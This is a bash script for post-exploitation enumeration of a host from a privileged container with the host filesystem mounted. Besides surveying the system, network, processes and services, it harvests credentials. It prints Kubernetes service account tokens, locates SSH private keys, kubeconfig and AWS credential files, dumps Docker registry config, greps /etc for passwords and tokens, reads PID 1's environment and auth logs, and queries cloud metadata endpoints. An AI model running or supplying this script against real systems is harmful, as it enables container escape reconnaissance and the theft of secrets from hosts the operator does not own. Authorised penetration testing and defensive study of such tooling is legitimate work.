#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | grep -E "(NAME|VERSION)" || echo "  Cannot read OS info"
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null || cat /host/proc/version 2>/dev/null | head -1
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null || cat /host/etc/hostname 2>/dev/null
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null || cat /host/proc/uptime 2>/dev/null
echo ""

echo "[*] CPU Information:"
chroot /host lscpu 2>/dev/null | head -10 || cat /host/proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
echo ""

echo "[*] Memory Information:"
chroot /host free -h 2>/dev/null || cat /host/proc/meminfo 2>/dev/null | head -5
echo ""

echo "=== 2. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null | grep -E "^[0-9]+:|inet " || cat /host/proc/net/route 2>/dev/null | head -5
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null | head -10 || cat /host/proc/net/route 2>/dev/null | head -10
echo ""

echo "[*] ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Ports (from /proc/net/tcp):"
cat /host/proc/net/tcp 2>/dev/null | awk '{print $2, $10}' | head -20
echo ""

echo "[*] DNS Configuration:"
chroot /host cat /etc/resolv.conf 2>/dev/null
echo ""

echo "=== 3. USERS AND GROUPS ==="
echo "[*] Users (from /etc/passwd):"
chroot /host cat /etc/passwd 2>/dev/null | grep -E ":/bin/(bash|sh)" | head -10
echo ""

echo "[*] Root user details:"
chroot /host cat /etc/passwd 2>/dev/null | grep "^root"
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10
echo ""

echo "[*] Groups:"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""

echo "=== 4. RUNNING PROCESSES ==="
echo "[*] Process List (top 20 by PID):"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/cmdline 2>/dev/null | strings | head -20
echo ""

echo "[*] Process Tree:"
chroot /host pstree 2>/dev/null | head -30 || echo "  pstree not available"
echo ""

echo "=== 5. SERVICES AND SYSTEMD ==="
echo "[*] Systemd Services (running):"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "  systemctl not available"
echo ""

echo "[*] Enabled Services:"
chroot /host systemctl list-unit-files --type=service --state=enabled 2>/dev/null | head -20 || echo "  systemctl not available"
echo ""

echo "=== 6. DOCKER/KUBERNETES ==="
echo "[*] Docker Socket:"
ls -la /host/var/run/docker.sock 2>/dev/null || ls -la /host/run/docker.sock 2>/dev/null || echo "  Docker socket not found"
echo ""

echo "[*] Containerd Socket:"
ls -la /host/run/containerd/containerd.sock 2>/dev/null || ls -la /host/var/run/containerd/containerd.sock 2>/dev/null || echo "  Containerd socket not found"
echo ""

echo "[*] Kubernetes Components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet directory not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Kubernetes Service Account (if in pod):"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "  [Token found!]" || echo "  No service account token"
cat /host/var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "  [Namespace found!]" || echo "  No namespace file"
echo ""

echo "=== 7. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH Keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "  No root .ssh directory"
find /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | head -10
echo ""

echo "[*] Docker Config:"
chroot /host cat /root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "  No Docker config found"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""

echo "[*] Kubernetes Config:"
find /host -path "*/.kube/config" 2>/dev/null | head -5
find /host -name "kubeconfig" 2>/dev/null | head -5
echo ""

echo "[*] AWS Credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -5
find /host -path "*/.aws/credentials" 2>/dev/null | head -5
echo ""

echo "[*] Environment Files with Secrets:"
find /host -name ".env" -type f 2>/dev/null | head -10
grep -r "PASSWORD\|SECRET\|API_KEY\|TOKEN" /host/etc 2>/dev/null | head -5 || echo "  No obvious secrets in /etc"
echo ""

echo "=== 8. SCHEDULED TASKS ==="
echo "[*] Crontab:"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
echo ""

echo "[*] User Crontabs:"
chroot /host ls -la /var/spool/cron/crontabs/ 2>/dev/null || chroot /host ls -la /var/spool/cron/ 2>/dev/null || echo "  Cannot access crontabs"
echo ""

echo "[*] Systemd Timers:"
chroot /host systemctl list-timers 2>/dev/null | head -10 || echo "  systemctl not available"
echo ""

echo "=== 9. MOUNTED FILESYSTEMS ==="
echo "[*] Mount Points:"
chroot /host mount 2>/dev/null | head -20 || cat /host/proc/mounts | head -20
echo ""

echo "[*] Disk Usage:"
chroot /host df -h 2>/dev/null | head -15
echo ""

echo "=== 10. INSTALLED SOFTWARE ==="
echo "[*] Installed Packages (if Debian/Ubuntu):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  Not a Debian-based system"
echo ""

echo "[*] Installed Packages (if RedHat/CentOS):"
chroot /host rpm -qa 2>/dev/null | head -20 || echo "  Not an RPM-based system"
echo ""

echo "[*] Docker Images (if docker command available):"
chroot /host docker images 2>/dev/null | head -10 || echo "  Docker CLI not available"
echo ""

echo "=== 11. ENVIRONMENT VARIABLES ==="
echo "[*] System Environment (from /proc/1/environ):"
cat /host/proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20
echo ""

echo "=== 12. LOG FILES ==="
echo "[*] Recent Auth Logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  Cannot access auth logs"
echo ""

echo "[*] Recent System Logs:"
chroot /host journalctl -n 20 2>/dev/null | head -20 || echo "  journalctl not available"
echo ""

echo "=== 13. CLOUD PROVIDER METADATA ==="
echo "[*] AWS Metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -10 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP Metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -10 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure Metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
